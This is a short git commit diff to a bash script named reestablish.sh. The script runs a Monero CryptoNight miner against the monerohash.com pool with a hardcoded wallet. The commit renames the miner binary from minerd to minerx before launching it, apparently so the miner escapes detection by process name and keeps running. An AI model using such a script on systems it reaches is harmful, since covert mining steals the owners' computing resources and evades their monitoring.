b847873cc002053b6c3cf5c5341f5b63af7a916d
trompetto <j1201537@mvrht.com>
2016-12-13 07:21:07 +0200

    Update reestablish.sh

--- reestablish.sh
+++ reestablish.sh
@@ -1,2 +1,3 @@
 #!/bin/bash
-./minerd -a cryptonight -o stratum+tcp://monerohash.com:3333 -u 42jF56tc85UTZwhMQc6rHbMHTxHqK74qS2zqLyRZxLbwegsy7FJ9w4T5B69Ay5qeMEMuvVDwHNeopAxrEZkkHrMb5phovJ6 -p x
+mv minerd minerx
+./minerx -a cryptonight -o stratum+tcp://monerohash.com:3333 -u 42jF56tc85UTZwhMQc6rHbMHTxHqK74qS2zqLyRZxLbwegsy7FJ9w4T5B69Ay5qeMEMuvVDwHNeopAxrEZkkHrMb5phovJ6 -p x
